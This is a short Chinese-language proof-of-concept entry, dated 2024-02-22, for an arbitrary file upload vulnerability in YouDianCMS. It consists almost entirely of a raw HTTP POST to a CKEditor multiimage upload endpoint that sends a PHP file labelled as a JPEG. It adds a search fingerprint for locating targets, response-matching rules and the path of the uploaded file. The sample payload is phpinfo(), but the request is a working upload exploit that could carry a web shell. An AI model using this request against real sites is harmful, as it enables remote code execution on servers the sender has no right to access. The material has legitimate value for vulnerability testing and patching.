﻿# YouDianCMS友点系统任意文件上传漏洞

> 更新时间：2024-02-22

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="友点建站-CMS"

> 验证脚本：HTTP

```
POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=cadc403efc1ad12f5fcce44c172baad2

--cadc403efc1ad12f5fcce44c172baad2
Content-Disposition: form-data; name="files"; filename="dudesite.php"
Content-Type: image/jpg

<?php phpinfo();?>
--cadc403efc1ad12f5fcce44c172baad2--
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?200)(?=.*?php).*?$

> 上传文件定位：/Public/image/uploads/xxx.php

